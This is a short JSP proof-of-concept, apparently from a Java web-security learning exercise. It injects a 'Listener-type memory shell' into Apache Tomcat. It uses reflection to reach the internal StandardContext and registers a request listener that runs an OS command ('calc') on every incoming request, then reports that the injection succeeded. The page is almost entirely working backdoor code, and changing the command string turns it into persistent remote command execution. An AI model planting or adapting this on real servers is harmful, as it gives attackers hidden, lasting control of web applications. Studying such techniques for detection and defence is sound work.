<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%--
  Created by IntelliJ IDEA.
  User: 鄢永炬
  Date: 2024/3/6
  Time: 0:00
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%!
    public class CmdListener implements ServletRequestListener{
        @Override
        public void requestDestroyed(ServletRequestEvent sre) {

        }

        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            try {
                Runtime.getRuntime().exec("calc");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
%>

<%
    Field reqField = request.getClass().getDeclaredField("request");
	reqField.setAccessible(true);
    Request req = (Request) reqField.get(request);
    StandardContext context = (StandardContext) req.getContext();
%>
<%
    CmdListener listener = new CmdListener();
    context.addApplicationEventListener(listener);
%>
Listener型内存马注入成功！
</body>
</html>
